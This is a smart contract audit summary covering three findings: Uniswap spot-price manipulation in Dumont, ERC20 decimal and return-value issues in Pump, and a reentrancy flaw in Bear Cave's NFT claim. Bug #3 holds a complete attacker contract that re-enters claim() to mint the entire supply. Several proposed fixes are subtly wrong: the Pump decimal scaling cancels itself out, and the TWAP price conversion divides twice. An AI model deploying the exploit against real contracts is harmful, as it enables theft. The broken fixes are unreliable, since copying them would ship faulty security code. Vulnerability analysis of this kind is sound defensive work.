# Smart Contract Security Bug Analysis Report

## Executive Summary

This report documents 3 distinct security vulnerabilities identified in smart contract codebases from the Pashov Audit Group security reviews. The bugs represent different categories of vulnerabilities: price manipulation, token standard incompatibility, and reentrancy attacks. Each bug is analyzed with detailed explanations, proof of concepts, and comprehensive fixes.

---

## Bug #1: Price Manipulation via Oracle Manipulation (Dumont Game Protocol)

### **Severity: HIGH**
**Impact:** High | **Likelihood:** Medium

### **Description**

The Dumont game protocol's reward system is vulnerable to price manipulation attacks through its use of spot price oracles. The `MontRewardManager` contract calculates MONT token rewards based on the current Uniswap pool price, which can be easily manipulated by attackers.

### **Vulnerable Code**

```solidity
function transferPlayerRewards(...) external returns (uint256 reward) {
    uint256 price = getMontPrice();
    uint256 houseFeeFixedPoint = houseFee * 1e18;
    reward = ((houseFeeFixedPoint * 8) / 10) / price;
    balances[_player] += reward;
}

function getMontPrice() private returns (uint256 price) {
    price = quoter.quoteExactInputSingle(address(mont), address(usdt), poolFee, 1e18, 0);
}
```

**Location:** `team/md/Dumont-security-review.md` lines 173-188

### **Vulnerability Analysis**

The vulnerability exists because:

1. **Spot Price Dependency:** The reward calculation relies on `quoteExactInputSingle()` which returns the current pool price
2. **Easy Manipulation:** Pool reserves can be manipulated through large swaps in a single transaction
3. **MEV Opportunity:** Attackers can sandwich the `revealCard()` transaction to exploit price changes
4. **Amplified Impact:** Lower MONT prices result in higher token rewards, creating strong attack incentives

### **Attack Scenario**

```
1. Attacker monitors for pending revealCard() transactions
2. Front-runs with large swap to decrease MONT price 
3. revealCard() executes with manipulated low price
4. Attacker receives inflated MONT rewards
5. Back-runs to restore price and profit from additional tokens
```

### **Proof of Impact**

If MONT price is manipulated from $0.000016 to $0.000008 (50% decrease), the attacker would receive ~100% more rewards than intended.

### **Fix Implementation**

**Immediate Fix:**
```solidity
function getMontPrice() private view returns (uint256 price) {
    // Use TWAP over 30 minutes to prevent manipulation
    uint32[] memory secondsAgos = new uint32[](2);
    secondsAgos[0] = 1800; // 30 minutes ago
    secondsAgos[1] = 0;    // now
    
    (int56[] memory tickCumulatives,) = IUniswapV3Pool(pool).observe(secondsAgos);
    
    int24 avgTick = int24((tickCumulatives[1] - tickCumulatives[0]) / 1800);
    uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(avgTick);
    
    price = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96);
    price = FullMath.mulDiv(price, 1e18, 2**192); // Convert to USDT per MONT
}
```

**Alternative Solutions:**
- Implement Chainlink oracle as primary price source
- Add price deviation checks between multiple sources
- Implement cooling periods between reward calculations

---

## Bug #2: Token Standard Incompatibility (Pump Protocol)

### **Severity: MEDIUM**
**Impact:** Medium | **Likelihood:** Medium  

### **Description**

The Pump protocol's order fulfillment system is incompatible with widely-used ERC20 tokens that don't return boolean values from `transfer`/`transferFrom` functions or have non-standard decimal implementations.

### **Vulnerable Code**

```solidity
if (order.isBuy) {
    ERC20(order.baseToken).transferFrom(order.maker, msg.sender, baseTokenAmount - fee);
    ERC20(order.baseToken).transferFrom(order.maker, owner(), fee);
    Token(order.assetToken).transferFrom(msg.sender, order.recipient, amount);
} else {
    ERC20(order.baseToken).transferFrom(msg.sender, order.recipient, baseTokenAmount - fee);
    ERC20(order.baseToken).transferFrom(msg.sender, owner(), fee);
    Token(order.assetToken).transferFrom(order.maker, msg.sender, amount);
}
```

**Location:** `solo/md/Pump-security-review.md` lines 51-62

### **Vulnerability Analysis**

The protocol has two major compatibility issues:

1. **Missing Return Value Handling:** Tokens like USDT and BNB don't return boolean values
2. **Decimal Assumption:** The math assumes all tokens have exactly 18 decimals, but:
   - USDT/USDC have 6 decimals
   - YAM-V2 has 24 decimals  
   - This breaks wad-based calculations

### **Impact Examples**

**Low Decimal Tokens (USDT - 6 decimals):**
- Expected: 1,000 USDT (1e9 with 6 decimals)
- Calculated: 1,000,000,000,000,000,000 (1e18) 
- Result: Transaction reverts due to insufficient balance

**High Decimal Tokens (YAM-V2 - 24 decimals):**
- User expects to pay 100 tokens
- Protocol calculates based on 18 decimal assumption
- User pays 1,000,000x more than intended

### **Fix Implementation**

```solidity
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract PumpV1 {
    using SafeERC20 for IERC20;
    
    // Add token whitelist with decimal validation
    mapping(address => bool) public supportedTokens;
    mapping(address => uint8) public tokenDecimals;
    
    function addSupportedToken(address token) external onlyOwner {
        uint8 decimals = IERC20Metadata(token).decimals();
        require(decimals <= 18, "Token decimals too high");
        
        supportedTokens[token] = true;
        tokenDecimals[token] = decimals;
    }
    
    function fulfill(Order calldata order, bytes calldata signature) external {
        require(supportedTokens[order.baseToken], "Token not supported");
        
        // Scale amounts to 18 decimals for internal calculations
        uint256 scaleFactor = 10 ** (18 - tokenDecimals[order.baseToken]);
        uint256 scaledBaseAmount = baseTokenAmount * scaleFactor;
        uint256 scaledFee = fee * scaleFactor;
        
        // Scale back down for actual transfers
        uint256 transferAmount = scaledBaseAmount / scaleFactor;
        uint256 transferFee = scaledFee / scaleFactor;
        
        if (order.isBuy) {
            IERC20(order.baseToken).safeTransferFrom(order.maker, msg.sender, transferAmount - transferFee);
            IERC20(order.baseToken).safeTransferFrom(order.maker, owner(), transferFee);
            Token(order.assetToken).transferFrom(msg.sender, order.recipient, amount);
        } else {
            IERC20(order.baseToken).safeTransferFrom(msg.sender, order.recipient, transferAmount - transferFee);
            IERC20(order.baseToken).safeTransferFrom(msg.sender, owner(), transferFee);
            Token(order.assetToken).transferFrom(order.maker, msg.sender, amount);
        }
    }
}
```

**Additional Safeguards:**
- Implement token balance checks before transfers
- Add slippage protection for decimal scaling
- Whitelist approach for supported tokens

---

## Bug #3: Reentrancy Attack in NFT Minting (Bear Cave Protocol)

### **Severity: CRITICAL**
**Impact:** High | **Likelihood:** High

### **Description**

The Bear Cave protocol's `claim` function is vulnerable to reentrancy attacks, allowing malicious users to mint the entire supply of HoneyJar NFTs for free by exploiting the unsafe external call in `safeMint`.

### **Vulnerable Code**

```solidity
function claim(uint8 bundleId_, uint8 gateId, uint256 numClaim, bytes32[] calldata proof) external {
    _canMintHoneyJar(bundleId_, numClaim); // Validating here because numClaims can change

    // If for some reason this fails, GG no honeyJar for you
    _mintHoneyJarForBear(msg.sender, bundleId_, numClaim);

    claimed[bundleId_] += numClaim;
    // Can be combined with "claim" call above, but keeping separate to separate view + modification on gatekeeper
    gatekeeper.addClaimed(bundleId_, gateId, numClaim, proof);
}
```

**Location:** `solo/md/BearCave-security-review.md` lines 151-161

### **Vulnerability Analysis**

The reentrancy vulnerability occurs because:

1. **State Updates After External Call:** `claimed[bundleId_]` is updated AFTER `_mintHoneyJarForBear()`
2. **Unsafe External Call:** `_mintHoneyJarForBear()` calls `safeMint()` which triggers `onERC721Received()`
3. **Checkpoint Bypass:** The `gatekeeper.addClaimed()` is also called after the external call
4. **Multiple Invariant Breaks:** Both supply limits and per-gate limits can be exceeded

### **Attack Implementation**

```solidity
contract ReentrancyAttacker {
    HoneyBox public immutable honeyBox;
    uint8 private bundleId;
    uint8 private gateId; 
    bytes32[] private proof;
    bool private attacking = false;
    
    constructor(address _honeyBox) {
        honeyBox = HoneyBox(_honeyBox);
    }
    
    function attack(uint8 _bundleId, uint8 _gateId, bytes32[] calldata _proof) external {
        bundleId = _bundleId;
        gateId = _gateId;
        proof = _proof;
        
        // Start the attack
        honeyBox.claim(bundleId, gateId, 1, proof);
    }
    
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!attacking) {
            attacking = true;
            
            // Reenter while claimed[bundleId] hasn't been updated yet
            while (honeyBox.totalSupply() < honeyBox.maxHoneyJar()) {
                honeyBox.claim(bundleId, gateId, 1, proof);
            }
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

### **Attack Impact**

- **Total Supply Theft:** Attacker mints all available NFTs paying nothing
- **Game Manipulation:** Likely becomes the "special HoneyJar" winner  
- **Prize Pool Theft:** Claims all deposited NFTs in the bundle
- **Economic Loss:** Protocol loses all intended revenue from minting

### **Fix Implementation**

**Option 1: Reentrancy Guard**
```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract HoneyBox is ReentrancyGuard {
    function claim(uint8 bundleId_, uint8 gateId, uint256 numClaim, bytes32[] calldata proof) 
        external 
        nonReentrant 
    {
        _canMintHoneyJar(bundleId_, numClaim);
        _mintHoneyJarForBear(msg.sender, bundleId_, numClaim);
        claimed[bundleId_] += numClaim;
        gatekeeper.addClaimed(bundleId_, gateId, numClaim, proof);
    }
}
```

**Option 2: Checks-Effects-Interactions (CEI) Pattern**
```solidity
function claim(uint8 bundleId_, uint8 gateId, uint256 numClaim, bytes32[] calldata proof) external {
    // CHECKS
    _canMintHoneyJar(bundleId_, numClaim);
    
    // EFFECTS - Update state before external calls
    claimed[bundleId_] += numClaim;
    gatekeeper.addClaimed(bundleId_, gateId, numClaim, proof);
    
    // INTERACTIONS - External calls last
    _mintHoneyJarForBear(msg.sender, bundleId_, numClaim);
}
```

**Recommended Approach:** Combine both patterns for maximum security:

```solidity
function claim(uint8 bundleId_, uint8 gateId, uint256 numClaim, bytes32[] calldata proof) 
    external 
    nonReentrant 
{
    // Checks
    _canMintHoneyJar(bundleId_, numClaim);
    require(claimed[bundleId_] + numClaim <= maxClaimed[bundleId_], "Exceeds max claims");
    
    // Effects  
    claimed[bundleId_] += numClaim;
    gatekeeper.addClaimed(bundleId_, gateId, numClaim, proof);
    
    // Interactions
    _mintHoneyJarForBear(msg.sender, bundleId_, numClaim);
    
    emit Claimed(msg.sender, bundleId_, numClaim);
}
```

---

## Summary and Recommendations

### **Critical Actions Required**

1. **Immediate Fixes:**
   - Implement reentrancy protection in Bear Cave protocol
   - Deploy TWAP oracle for Dumont price feeds  
   - Add SafeERC20 usage in Pump protocol

2. **Security Best Practices:**
   - Always follow Checks-Effects-Interactions pattern
   - Use manipulation-resistant price oracles
   - Implement comprehensive token compatibility checks
   - Add reentrancy guards to state-changing functions

3. **Testing Recommendations:**
   - Create specific test cases for each vulnerability
   - Implement fuzzing for edge cases
   - Add integration tests with various token types
   - Test oracle manipulation scenarios

### **Long-term Security Improvements**

- Implement time-delays for critical operations
- Add multi-signature requirements for admin functions  
- Deploy circuit breakers for unusual activity
- Regular security audits and monitoring systems

These vulnerabilities demonstrate the importance of rigorous security practices in smart contract development, particularly around external integrations, state management, and token standards compliance.